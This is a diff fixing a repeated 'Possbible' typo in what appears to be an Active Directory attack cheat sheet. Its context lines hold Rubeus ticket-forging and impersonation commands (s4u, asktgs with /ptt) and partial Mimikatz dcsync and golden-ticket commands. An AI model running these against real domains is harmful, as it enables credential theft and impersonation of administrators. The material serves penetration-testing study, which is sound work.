@@ -923,7 +923,7 @@ Get-DomainUser | Where-Object {!($_.memberof -match "Protected Users")} | Where-
 ```
 
 #### Rubeus request and inject TGT + TGS
-- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
+- Possible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
 - Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right. 
 - Make sure they are local admin on the target machine.
 ```
@@ -951,7 +951,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN
 ```
 
 #### Rubeus request and inject TGT + TGS
-- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
+- Possible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
 ```
 .\Rubeus.exe s4u /impersonateuser:<USER> /msdsspn:cifs/<FQDN COMPUTER> /user:<COMPUTER>$ /aes256:<AES HASH> /opsec /altservice:<SECOND SERVICE> /ptt 
 .\Rubeus.exe s4u /impersonateuser:<USER> /msdsspn:cifs/<FQDN COMPUTER> /user:<COMPUTER>$ /rc4:<NTLM> /altservice:<SECOND SERVICE> /ptt 
@@ -1067,7 +1067,7 @@ Get-DomainUser | Where-Object {!($_.memberof -match "Protected Users")} | Where-
 
 #### Impersonate another user (For example DA)
 - Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right
-- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
+- Possible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
 ```
 .\Rubeus.exe s4u /user:<USER OR COMPUTER$> /rc4:<HASH> /impersonateuser:<TARGET USER DA> /msdsspn:cifs/<TARGET COMPUTER> /ptt
 
@@ -2360,7 +2360,7 @@ Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<FQDN CH
 ```
 
 #### Create a TGS using Rubeus and inject current Powershell session
-- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
+- Possible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
 ```
 .\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:<SERVICE>/<FQDN PARENT DC> /dc:<FQDN PARENT DC> /ptt
 ```
@@ -2463,7 +2463,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN>
 ```
 
 #### Create and inject TGS
-- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
+- Possible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
 ```
 .\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:CIFS/<TARGET SERVER> /dc:<TARGET FOREST DC> /ptt
 ```
@@ -2507,7 +2507,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN>
 ```
 
 #### Create and inject TGS
-- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
+- Possible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
 ```
 .\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:<SERVICE>/<TARGET SERVER> /dc:<TARGET FOREST DC> /ptt
 ```
